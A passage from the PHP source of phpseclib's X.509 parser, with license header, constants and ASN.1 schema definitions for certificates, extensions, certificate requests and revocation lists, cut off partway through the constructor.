<?php

/**
 * Pure-PHP X.509 Parser
 *
 * PHP versions 4 and 5
 *
 * Encode and decode X.509 certificates.
 *
 * The extensions are from {@link http://tools.ietf.org/html/rfc5280 RFC5280} and
 * {@link http://web.archive.org/web/19961027104704/http://www3.netscape.com/eng/security/cert-exts.html Netscape Certificate Extensions}.
 *
 * Note that loading an X.509 certificate and resaving it may invalidate the signature.  The reason being that the signature is based on a
 * portion of the certificate that contains optional parameters with default values.  ie. if the parameter isn't there the default value is
 * used.  Problem is, if the parameter is there and it just so happens to have the default value there are two ways that that parameter can
 * be encoded.  It can be encoded explicitly or left out all together.  This would effect the signature value and thus may invalidate the
 * the certificate all together unless the certificate is re-signed.
 *
 * LICENSE: Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @category  File
 * @package   File_X509
 * @author    Jim Wigginton <terrafrost@php.net>
 * @copyright 2012 Jim Wigginton
 * @license   http://www.opensource.org/licenses/mit-license.html  MIT License
 * @link      http://phpseclib.sourceforge.net
 */

/**
 * Include File_ASN1
 */
if (!class_exists('File_ASN1')) {
    include_once 'ASN1.php';
}

/**
 * Flag to only accept signatures signed by certificate authorities
 *
 * Not really used anymore but retained all the same to suppress E_NOTICEs from old installs
 *
 * @access public
 */
define('FILE_X509_VALIDATE_SIGNATURE_BY_CA', 1);

/**#@+
 * @access public
 * @see self::getDN()
 */
/**
 * Return internal array representation
 */
define('FILE_X509_DN_ARRAY', 0);
/**
 * Return string
 */
define('FILE_X509_DN_STRING', 1);
/**
 * Return ASN.1 name string
 */
define('FILE_X509_DN_ASN1', 2);
/**
 * Return OpenSSL compatible array
 */
define('FILE_X509_DN_OPENSSL', 3);
/**
 * Return canonical ASN.1 RDNs string
 */
define('FILE_X509_DN_CANON', 4);
/**
 * Return name hash for file indexing
 */
define('FILE_X509_DN_HASH', 5);
/**#@-*/

/**#@+
 * @access public
 * @see self::saveX509()
 * @see self::saveCSR()
 * @see self::saveCRL()
 */
/**
 * Save as PEM
 *
 * ie. a base64-encoded PEM with a header and a footer
 */
define('FILE_X509_FORMAT_PEM', 0);
/**
 * Save as DER
 */
define('FILE_X509_FORMAT_DER', 1);
/**
 * Save as a SPKAC
 *
 * Only works on CSRs. Not currently supported.
 */
define('FILE_X509_FORMAT_SPKAC', 2);
/**
 * Auto-detect the format
 *
 * Used only by the load*() functions
 */
define('FILE_X509_FORMAT_AUTO_DETECT', 3);
/**#@-*/

/**
 * Attribute value disposition.
 * If disposition is >= 0, this is the index of the target value.
 */
define('FILE_X509_ATTR_ALL', -1); // All attribute values (array).
define('FILE_X509_ATTR_APPEND', -2); // Add a value.
define('FILE_X509_ATTR_REPLACE', -3); // Clear first, then add a value.

/**
 * Pure-PHP X.509 Parser
 *
 * @package File_X509
 * @author  Jim Wigginton <terrafrost@php.net>
 * @access  public
 */
class File_X509
{
    /**
     * ASN.1 syntax for X.509 certificates
     *
     * @var array
     * @access private
     */
    var $Certificate;

    /**#@+
     * ASN.1 syntax for various extensions
     *
     * @access private
     */
    var $DirectoryString;
    var $PKCS9String;
    var $AttributeValue;
    var $Extensions;
    var $KeyUsage;
    var $ExtKeyUsageSyntax;
    var $BasicConstraints;
    var $KeyIdentifier;
    var $CRLDistributionPoints;
    var $AuthorityKeyIdentifier;
    var $CertificatePolicies;
    var $AuthorityInfoAccessSyntax;
    var $SubjectAltName;
    var $SubjectDirectoryAttributes;
    var $PrivateKeyUsagePeriod;
    var $IssuerAltName;
    var $PolicyMappings;
    var $NameConstraints;

    var $CPSuri;
    var $UserNotice;

    var $netscape_cert_type;
    var $netscape_comment;
    var $netscape_ca_policy_url;

    var $Name;
    var $RelativeDistinguishedName;
    var $CRLNumber;
    var $CRLReason;
    var $IssuingDistributionPoint;
    var $InvalidityDate;
    var $CertificateIssuer;
    var $HoldInstructionCode;
    var $SignedPublicKeyAndChallenge;
    /**#@-*/

    /**#@+
     * ASN.1 syntax for various DN attributes
     *
     * @access private
     */
    var $PostalAddress;
    /**#@-*/

    /**
     * ASN.1 syntax for Certificate Signing Requests (RFC2986)
     *
     * @var array
     * @access private
     */
    var $CertificationRequest;

    /**
     * ASN.1 syntax for Certificate Revocation Lists (RFC5280)
     *
     * @var array
     * @access private
     */
    var $CertificateList;

    /**
     * Distinguished Name
     *
     * @var array
     * @access private
     */
    var $dn;

    /**
     * Public key
     *
     * @var string
     * @access private
     */
    var $publicKey;

    /**
     * Private key
     *
     * @var string
     * @access private
     */
    var $privateKey;

    /**
     * Object identifiers for X.509 certificates
     *
     * @var array
     * @access private
     * @link http://en.wikipedia.org/wiki/Object_identifier
     */
    var $oids;

    /**
     * The certificate authorities
     *
     * @var array
     * @access private
     */
    var $CAs;

    /**
     * The currently loaded certificate
     *
     * @var array
     * @access private
     */
    var $currentCert;

    /**
     * The signature subject
     *
     * There's no guarantee File_X509 is going to re-encode an X.509 cert in the same way it was originally
     * encoded so we take save the portion of the original cert that the signature would have made for.
     *
     * @var string
     * @access private
     */
    var $signatureSubject;

    /**
     * Certificate Start Date
     *
     * @var string
     * @access private
     */
    var $startDate;

    /**
     * Certificate End Date
     *
     * @var string
     * @access private
     */
    var $endDate;

    /**
     * Serial Number
     *
     * @var string
     * @access private
     */
    var $serialNumber;

    /**
     * Key Identifier
     *
     * See {@link http://tools.ietf.org/html/rfc5280#section-4.2.1.1 RFC5280#section-4.2.1.1} and
     * {@link http://tools.ietf.org/html/rfc5280#section-4.2.1.2 RFC5280#section-4.2.1.2}.
     *
     * @var string
     * @access private
     */
    var $currentKeyIdentifier;

    /**
     * CA Flag
     *
     * @var bool
     * @access private
     */
    var $caFlag = false;

    /**
     * SPKAC Challenge
     *
     * @var string
     * @access private
     */
    var $challenge;

    /**
     * Default Constructor.
     *
     * @return File_X509
     * @access public
     */
    function __construct()
    {
        if (!class_exists('Math_BigInteger')) {
            include_once 'Math/BigInteger.php';
        }

        // Explicitly Tagged Module, 1988 Syntax
        // http://tools.ietf.org/html/rfc5280#appendix-A.1

        $this->DirectoryString = array(
            'type'     => FILE_ASN1_TYPE_CHOICE,
            'children' => array(
                'teletexString'   => array('type' => FILE_ASN1_TYPE_TELETEX_STRING),
                'printableString' => array('type' => FILE_ASN1_TYPE_PRINTABLE_STRING),
                'universalString' => array('type' => FILE_ASN1_TYPE_UNIVERSAL_STRING),
                'utf8String'      => array('type' => FILE_ASN1_TYPE_UTF8_STRING),
                'bmpString'       => array('type' => FILE_ASN1_TYPE_BMP_STRING)
            )
        );

        $this->PKCS9String = array(
            'type'     => FILE_ASN1_TYPE_CHOICE,
            'children' => array(
                'ia5String'       => array('type' => FILE_ASN1_TYPE_IA5_STRING),
                'directoryString' => $this->DirectoryString
            )
        );

        $this->AttributeValue = array('type' => FILE_ASN1_TYPE_ANY);

        $AttributeType = array('type' => FILE_ASN1_TYPE_OBJECT_IDENTIFIER);

        $AttributeTypeAndValue = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'type' => $AttributeType,
                'value'=> $this->AttributeValue
            )
        );

        /*
        In practice, RDNs containing multiple name-value pairs (called "multivalued RDNs") are rare,
        but they can be useful at times when either there is no unique attribute in the entry or you
        want to ensure that the entry's DN contains some useful identifying information.

        - https://www.opends.org/wiki/page/DefinitionRelativeDistinguishedName
        */
        $this->RelativeDistinguishedName = array(
            'type'     => FILE_ASN1_TYPE_SET,
            'min'      => 1,
            'max'      => -1,
            'children' => $AttributeTypeAndValue
        );

        // http://tools.ietf.org/html/rfc5280#section-4.1.2.4
        $RDNSequence = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            // RDNSequence does not define a min or a max, which means it doesn't have one
            'min'      => 0,
            'max'      => -1,
            'children' => $this->RelativeDistinguishedName
        );

        $this->Name = array(
            'type'     => FILE_ASN1_TYPE_CHOICE,
            'children' => array(
                'rdnSequence' => $RDNSequence
            )
        );

        // http://tools.ietf.org/html/rfc5280#section-4.1.1.2
        $AlgorithmIdentifier = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'algorithm'  => array('type' => FILE_ASN1_TYPE_OBJECT_IDENTIFIER),
                'parameters' => array(
                                    'type'     => FILE_ASN1_TYPE_ANY,
                                    'optional' => true
                                )
            )
        );

        /*
           A certificate using system MUST reject the certificate if it encounters
           a critical extension it does not recognize; however, a non-critical
           extension may be ignored if it is not recognized.

           http://tools.ietf.org/html/rfc5280#section-4.2
        */
        $Extension = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'extnId'   => array('type' => FILE_ASN1_TYPE_OBJECT_IDENTIFIER),
                'critical' => array(
                                  'type'     => FILE_ASN1_TYPE_BOOLEAN,
                                  'optional' => true,
                                  'default'  => false
                              ),
                'extnValue' => array('type' => FILE_ASN1_TYPE_OCTET_STRING)
            )
        );

        $this->Extensions = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'min'      => 1,
            // technically, it's MAX, but we'll assume anything < 0 is MAX
            'max'      => -1,
            // if 'children' isn't an array then 'min' and 'max' must be defined
            'children' => $Extension
        );

        $SubjectPublicKeyInfo = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'algorithm'        => $AlgorithmIdentifier,
                'subjectPublicKey' => array('type' => FILE_ASN1_TYPE_BIT_STRING)
            )
        );

        $UniqueIdentifier = array('type' => FILE_ASN1_TYPE_BIT_STRING);

        $Time = array(
            'type'     => FILE_ASN1_TYPE_CHOICE,
            'children' => array(
                'utcTime'     => array('type' => FILE_ASN1_TYPE_UTC_TIME),
                'generalTime' => array('type' => FILE_ASN1_TYPE_GENERALIZED_TIME)
            )
        );

        // http://tools.ietf.org/html/rfc5280#section-4.1.2.5
        $Validity = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'notBefore' => $Time,
                'notAfter'  => $Time
            )
        );

        $CertificateSerialNumber = array('type' => FILE_ASN1_TYPE_INTEGER);

        $Version = array(
            'type'    => FILE_ASN1_TYPE_INTEGER,
            'mapping' => array('v1', 'v2', 'v3')
        );

        // assert($TBSCertificate['children']['signature'] == $Certificate['children']['signatureAlgorithm'])
        $TBSCertificate = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                // technically, default implies optional, but we'll define it as being optional, none-the-less, just to
                // reenforce that fact
                'version'             => array(
                                             'constant' => 0,
                                             'optional' => true,
                                             'explicit' => true,
                                             'default'  => 'v1'
                                         ) + $Version,
                'serialNumber'         => $CertificateSerialNumber,
                'signature'            => $AlgorithmIdentifier,
                'issuer'               => $this->Name,
                'validity'             => $Validity,
                'subject'              => $this->Name,
                'subjectPublicKeyInfo' => $SubjectPublicKeyInfo,
                // implicit means that the T in the TLV structure is to be rewritten, regardless of the type
                'issuerUniqueID'       => array(
                                               'constant' => 1,
                                               'optional' => true,
                                               'implicit' => true
                                           ) + $UniqueIdentifier,
                'subjectUniqueID'       => array(
                                               'constant' => 2,
                                               'optional' => true,
                                               'implicit' => true
                                           ) + $UniqueIdentifier,
                // <http://tools.ietf.org/html/rfc2459#page-74> doesn't use the EXPLICIT keyword but if
                // it's not IMPLICIT, it's EXPLICIT
                'extensions'            => array(
                                               'constant' => 3,
                                               'optional' => true,
                                               'explicit' => true
                                           ) + $this->Extensions
            )
        );

        $this->Certificate = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                 'tbsCertificate'     => $TBSCertificate,
                 'signatureAlgorithm' => $AlgorithmIdentifier,
                 'signature'          => array('type' => FILE_ASN1_TYPE_BIT_STRING)
            )
        );

        $this->KeyUsage = array(
            'type'    => FILE_ASN1_TYPE_BIT_STRING,
            'mapping' => array(
                'digitalSignature',
                'nonRepudiation',
                'keyEncipherment',
                'dataEncipherment',
                'keyAgreement',
                'keyCertSign',
                'cRLSign',
                'encipherOnly',
                'decipherOnly'
            )
        );

        $this->BasicConstraints = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'cA'                => array(
                                                 'type'     => FILE_ASN1_TYPE_BOOLEAN,
                                                 'optional' => true,
                                                 'default'  => false
                                       ),
                'pathLenConstraint' => array(
                                                 'type' => FILE_ASN1_TYPE_INTEGER,
                                                 'optional' => true
                                       )
            )
        );

        $this->KeyIdentifier = array('type' => FILE_ASN1_TYPE_OCTET_STRING);

        $OrganizationalUnitNames = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'min'      => 1,
            'max'      => 4, // ub-organizational-units
            'children' => array('type' => FILE_ASN1_TYPE_PRINTABLE_STRING)
        );

        $PersonalName = array(
            'type'     => FILE_ASN1_TYPE_SET,
            'children' => array(
                'surname'              => array(
                                           'type' => FILE_ASN1_TYPE_PRINTABLE_STRING,
                                           'constant' => 0,
                                           'optional' => true,
                                           'implicit' => true
                                         ),
                'given-name'           => array(
                                           'type' => FILE_ASN1_TYPE_PRINTABLE_STRING,
                                           'constant' => 1,
                                           'optional' => true,
                                           'implicit' => true
                                         ),
                'initials'             => array(
                                           'type' => FILE_ASN1_TYPE_PRINTABLE_STRING,
                                           'constant' => 2,
                                           'optional' => true,
                                           'implicit' => true
                                         ),
                'generation-qualifier' => array(
                                           'type' => FILE_ASN1_TYPE_PRINTABLE_STRING,
                                           'constant' => 3,
                                           'optional' => true,
                                           'implicit' => true
                                         )
            )
        );

        $NumericUserIdentifier = array('type' => FILE_ASN1_TYPE_NUMERIC_STRING);

        $OrganizationName = array('type' => FILE_ASN1_TYPE_PRINTABLE_STRING);

        $PrivateDomainName = array(
            'type'     => FILE_ASN1_TYPE_CHOICE,
            'children' => array(
                'numeric'   => array('type' => FILE_ASN1_TYPE_NUMERIC_STRING),
                'printable' => array('type' => FILE_ASN1_TYPE_PRINTABLE_STRING)
            )
        );

        $TerminalIdentifier = array('type' => FILE_ASN1_TYPE_PRINTABLE_STRING);

        $NetworkAddress = array('type' => FILE_ASN1_TYPE_NUMERIC_STRING);

        $AdministrationDomainName = array(
            'type'     => FILE_ASN1_TYPE_CHOICE,
            // if class isn't present it's assumed to be FILE_ASN1_CLASS_UNIVERSAL or
            // (if constant is present) FILE_ASN1_CLASS_CONTEXT_SPECIFIC
            'class'    => FILE_ASN1_CLASS_APPLICATION,
            'cast'     => 2,
            'children' => array(
                'numeric'   => array('type' => FILE_ASN1_TYPE_NUMERIC_STRING),
                'printable' => array('type' => FILE_ASN1_TYPE_PRINTABLE_STRING)
            )
        );

        $CountryName = array(
            'type'     => FILE_ASN1_TYPE_CHOICE,
            // if class isn't present it's assumed to be FILE_ASN1_CLASS_UNIVERSAL or
            // (if constant is present) FILE_ASN1_CLASS_CONTEXT_SPECIFIC
            'class'    => FILE_ASN1_CLASS_APPLICATION,
            'cast'     => 1,
            'children' => array(
                'x121-dcc-code'        => array('type' => FILE_ASN1_TYPE_NUMERIC_STRING),
                'iso-3166-alpha2-code' => array('type' => FILE_ASN1_TYPE_PRINTABLE_STRING)
            )
        );

        $AnotherName = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                 'type-id' => array('type' => FILE_ASN1_TYPE_OBJECT_IDENTIFIER),
                 'value'   => array(
                                  'type' => FILE_ASN1_TYPE_ANY,
                                  'constant' => 0,
                                  'optional' => true,
                                  'explicit' => true
                              )
            )
        );

        $ExtensionAttribute = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                 'extension-attribute-type'  => array(
                                                    'type' => FILE_ASN1_TYPE_PRINTABLE_STRING,
                                                    'constant' => 0,
                                                    'optional' => true,
                                                    'implicit' => true
                                                ),
                 'extension-attribute-value' => array(
                                                    'type' => FILE_ASN1_TYPE_ANY,
                                                    'constant' => 1,
                                                    'optional' => true,
                                                    'explicit' => true
                                                )
            )
        );

        $ExtensionAttributes = array(
            'type'     => FILE_ASN1_TYPE_SET,
            'min'      => 1,
            'max'      => 256, // ub-extension-attributes
            'children' => $ExtensionAttribute
        );

        $BuiltInDomainDefinedAttribute = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                 'type'  => array('type' => FILE_ASN1_TYPE_PRINTABLE_STRING),
                 'value' => array('type' => FILE_ASN1_TYPE_PRINTABLE_STRING)
            )
        );

        $BuiltInDomainDefinedAttributes = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'min'      => 1,
            'max'      => 4, // ub-domain-defined-attributes
            'children' => $BuiltInDomainDefinedAttribute
        );

        $BuiltInStandardAttributes =  array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'country-name'               => array('optional' => true) + $CountryName,
                'administration-domain-name' => array('optional' => true) + $AdministrationDomainName,
                'network-address'            => array(
                                                 'constant' => 0,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ) + $NetworkAddress,
                'terminal-identifier'        => array(
                                                 'constant' => 1,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ) + $TerminalIdentifier,
                'private-domain-name'        => array(
                                                 'constant' => 2,
                                                 'optional' => true,
                                                 'explicit' => true
                                               ) + $PrivateDomainName,
                'organization-name'          => array(
                                                 'constant' => 3,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ) + $OrganizationName,
                'numeric-user-identifier'    => array(
                                                 'constant' => 4,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ) + $NumericUserIdentifier,
                'personal-name'              => array(
                                                 'constant' => 5,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ) + $PersonalName,
                'organizational-unit-names'  => array(
                                                 'constant' => 6,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ) + $OrganizationalUnitNames
            )
        );

        $ORAddress = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                 'built-in-standard-attributes'       => $BuiltInStandardAttributes,
                 'built-in-domain-defined-attributes' => array('optional' => true) + $BuiltInDomainDefinedAttributes,
                 'extension-attributes'               => array('optional' => true) + $ExtensionAttributes
            )
        );

        $EDIPartyName = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                 'nameAssigner' => array(
                                    'constant' => 0,
                                    'optional' => true,
                                    'implicit' => true
                                ) + $this->DirectoryString,
                 // partyName is technically required but File_ASN1 doesn't currently support non-optional constants and
                 // setting it to optional gets the job done in any event.
                 'partyName'    => array(
                                    'constant' => 1,
                                    'optional' => true,
                                    'implicit' => true
                                ) + $this->DirectoryString
            )
        );

        $GeneralName = array(
            'type'     => FILE_ASN1_TYPE_CHOICE,
            'children' => array(
                'otherName'                 => array(
                                                 'constant' => 0,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ) + $AnotherName,
                'rfc822Name'                => array(
                                                 'type' => FILE_ASN1_TYPE_IA5_STRING,
                                                 'constant' => 1,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ),
                'dNSName'                   => array(
                                                 'type' => FILE_ASN1_TYPE_IA5_STRING,
                                                 'constant' => 2,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ),
                'x400Address'               => array(
                                                 'constant' => 3,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ) + $ORAddress,
                'directoryName'             => array(
                                                 'constant' => 4,
                                                 'optional' => true,
                                                 'explicit' => true
                                               ) + $this->Name,
                'ediPartyName'              => array(
                                                 'constant' => 5,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ) + $EDIPartyName,
                'uniformResourceIdentifier' => array(
                                                 'type' => FILE_ASN1_TYPE_IA5_STRING,
                                                 'constant' => 6,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ),
                'iPAddress'                 => array(
                                                 'type' => FILE_ASN1_TYPE_OCTET_STRING,
                                                 'constant' => 7,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ),
                'registeredID'              => array(
                                                 'type' => FILE_ASN1_TYPE_OBJECT_IDENTIFIER,
                                                 'constant' => 8,
                                                 'optional' => true,
                                                 'implicit' => true
                                               )
            )
        );

        $GeneralNames = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'min'      => 1,
            'max'      => -1,
            'children' => $GeneralName
        );

        $this->IssuerAltName = $GeneralNames;

        $ReasonFlags = array(
            'type'    => FILE_ASN1_TYPE_BIT_STRING,
            'mapping' => array(
                'unused',
                'keyCompromise',
                'cACompromise',
                'affiliationChanged',
                'superseded',
                'cessationOfOperation',
                'certificateHold',
                'privilegeWithdrawn',
                'aACompromise'
            )
        );

        $DistributionPointName = array(
            'type'     => FILE_ASN1_TYPE_CHOICE,
            'children' => array(
                'fullName'                => array(
                                                 'constant' => 0,
                                                 'optional' => true,
                                                 'implicit' => true
                                       ) + $GeneralNames,
                'nameRelativeToCRLIssuer' => array(
                                                 'constant' => 1,
                                                 'optional' => true,
                                                 'implicit' => true
                                       ) + $this->RelativeDistinguishedName
            )
        );

        $DistributionPoint = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'distributionPoint' => array(
                                                 'constant' => 0,
                                                 'optional' => true,
                                                 'explicit' => true
                                       ) + $DistributionPointName,
                'reasons'           => array(
                                                 'constant' => 1,
                                                 'optional' => true,
                                                 'implicit' => true
                                       ) + $ReasonFlags,
                'cRLIssuer'         => array(
                                                 'constant' => 2,
                                                 'optional' => true,
                                                 'implicit' => true
                                       ) + $GeneralNames
            )
        );

        $this->CRLDistributionPoints = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'min'      => 1,
            'max'      => -1,
            'children' => $DistributionPoint
        );

        $this->AuthorityKeyIdentifier = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'keyIdentifier'             => array(
                                                 'constant' => 0,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ) + $this->KeyIdentifier,
                'authorityCertIssuer'       => array(
                                                 'constant' => 1,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ) + $GeneralNames,
                'authorityCertSerialNumber' => array(
                                                 'constant' => 2,
                                                 'optional' => true,
                                                 'implicit' => true
                                               ) + $CertificateSerialNumber
            )
        );

        $PolicyQualifierId = array('type' => FILE_ASN1_TYPE_OBJECT_IDENTIFIER);

        $PolicyQualifierInfo = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'policyQualifierId' => $PolicyQualifierId,
                'qualifier'         => array('type' => FILE_ASN1_TYPE_ANY)
            )
        );

        $CertPolicyId = array('type' => FILE_ASN1_TYPE_OBJECT_IDENTIFIER);

        $PolicyInformation = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'policyIdentifier' => $CertPolicyId,
                'policyQualifiers' => array(
                                          'type'     => FILE_ASN1_TYPE_SEQUENCE,
                                          'min'      => 0,
                                          'max'      => -1,
                                          'optional' => true,
                                          'children' => $PolicyQualifierInfo
                                      )
            )
        );

        $this->CertificatePolicies = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'min'      => 1,
            'max'      => -1,
            'children' => $PolicyInformation
        );

        $this->PolicyMappings = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'min'      => 1,
            'max'      => -1,
            'children' => array(
                              'type'     => FILE_ASN1_TYPE_SEQUENCE,
                              'children' => array(
                                  'issuerDomainPolicy' => $CertPolicyId,
                                  'subjectDomainPolicy' => $CertPolicyId
                              )
                       )
        );

        $KeyPurposeId = array('type' => FILE_ASN1_TYPE_OBJECT_IDENTIFIER);

        $this->ExtKeyUsageSyntax = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'min'      => 1,
            'max'      => -1,
            'children' => $KeyPurposeId
        );

        $AccessDescription = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'accessMethod'   => array('type' => FILE_ASN1_TYPE_OBJECT_IDENTIFIER),
                'accessLocation' => $GeneralName
            )
        );

        $this->AuthorityInfoAccessSyntax = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'min'      => 1,
            'max'      => -1,
            'children' => $AccessDescription
        );

        $this->SubjectAltName = $GeneralNames;

        $this->PrivateKeyUsagePeriod = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'notBefore' => array(
                                                 'constant' => 0,
                                                 'optional' => true,
                                                 'implicit' => true,
                                                 'type' => FILE_ASN1_TYPE_GENERALIZED_TIME),
                'notAfter'  => array(
                                                 'constant' => 1,
                                                 'optional' => true,
                                                 'implicit' => true,
                                                 'type' => FILE_ASN1_TYPE_GENERALIZED_TIME)
            )
        );

        $BaseDistance = array('type' => FILE_ASN1_TYPE_INTEGER);

        $GeneralSubtree = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'base'    => $GeneralName,
                'minimum' => array(
                                 'constant' => 0,
                                 'optional' => true,
                                 'implicit' => true,
                                 'default' => new Math_BigInteger(0)
                             ) + $BaseDistance,
                'maximum' => array(
                                 'constant' => 1,
                                 'optional' => true,
                                 'implicit' => true,
                             ) + $BaseDistance
            )
        );

        $GeneralSubtrees = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'min'      => 1,
            'max'      => -1,
            'children' => $GeneralSubtree
        );

        $this->NameConstraints = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'permittedSubtrees' => array(
                                           'constant' => 0,
                                           'optional' => true,
                                           'implicit' => true
                                       ) + $GeneralSubtrees,
                'excludedSubtrees'  => array(
                                           'constant' => 1,
                                           'optional' => true,
                                           'implicit' => true
                                       ) + $GeneralSubtrees
            )
        );

        $this->CPSuri = array('type' => FILE_ASN1_TYPE_IA5_STRING);

        $DisplayText = array(
            'type'     => FILE_ASN1_TYPE_CHOICE,
            'children' => array(
                'ia5String'     => array('type' => FILE_ASN1_TYPE_IA5_STRING),
                'visibleString' => array('type' => FILE_ASN1_TYPE_VISIBLE_STRING),
                'bmpString'     => array('type' => FILE_ASN1_TYPE_BMP_STRING),
                'utf8String'    => array('type' => FILE_ASN1_TYPE_UTF8_STRING)
            )
        );

        $NoticeReference = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'organization'  => $DisplayText,
                'noticeNumbers' => array(
                                       'type'     => FILE_ASN1_TYPE_SEQUENCE,
                                       'min'      => 1,
                                       'max'      => 200,
                                       'children' => array('type' => FILE_ASN1_TYPE_INTEGER)
                                   )
            )
        );

        $this->UserNotice = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'noticeRef' => array(
                                           'optional' => true,
                                           'implicit' => true
                                       ) + $NoticeReference,
                'explicitText'  => array(
                                           'optional' => true,
                                           'implicit' => true
                                       ) + $DisplayText
            )
        );

        // mapping is from <http://www.mozilla.org/projects/security/pki/nss/tech-notes/tn3.html>
        $this->netscape_cert_type = array(
            'type'    => FILE_ASN1_TYPE_BIT_STRING,
            'mapping' => array(
                'SSLClient',
                'SSLServer',
                'Email',
                'ObjectSigning',
                'Reserved',
                'SSLCA',
                'EmailCA',
                'ObjectSigningCA'
            )
        );

        $this->netscape_comment = array('type' => FILE_ASN1_TYPE_IA5_STRING);
        $this->netscape_ca_policy_url = array('type' => FILE_ASN1_TYPE_IA5_STRING);

        // attribute is used in RFC2986 but we're using the RFC5280 definition

        $Attribute = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'type' => $AttributeType,
                'value'=> array(
                              'type'     => FILE_ASN1_TYPE_SET,
                              'min'      => 1,
                              'max'      => -1,
                              'children' => $this->AttributeValue
                          )
            )
        );

        $this->SubjectDirectoryAttributes = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'min'      => 1,
            'max'      => -1,
            'children' => $Attribute
        );

        // adapted from <http://tools.ietf.org/html/rfc2986>

        $Attributes = array(
            'type'     => FILE_ASN1_TYPE_SET,
            'min'      => 1,
            'max'      => -1,
            'children' => $Attribute
        );

        $CertificationRequestInfo = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'version'       => array(
                                       'type' => FILE_ASN1_TYPE_INTEGER,
                                       'mapping' => array('v1')
                                   ),
                'subject'       => $this->Name,
                'subjectPKInfo' => $SubjectPublicKeyInfo,
                'attributes'    => array(
                                       'constant' => 0,
                                       'optional' => true,
                                       'implicit' => true
                                   ) + $Attributes,
            )
        );

        $this->CertificationRequest = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'certificationRequestInfo' => $CertificationRequestInfo,
                'signatureAlgorithm'       => $AlgorithmIdentifier,
                'signature'                => array('type' => FILE_ASN1_TYPE_BIT_STRING)
            )
        );

        $RevokedCertificate = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                              'userCertificate'    => $CertificateSerialNumber,
                              'revocationDate'     => $Time,
                              'crlEntryExtensions' => array(
                                                          'optional' => true
                                                      ) + $this->Extensions
                          )
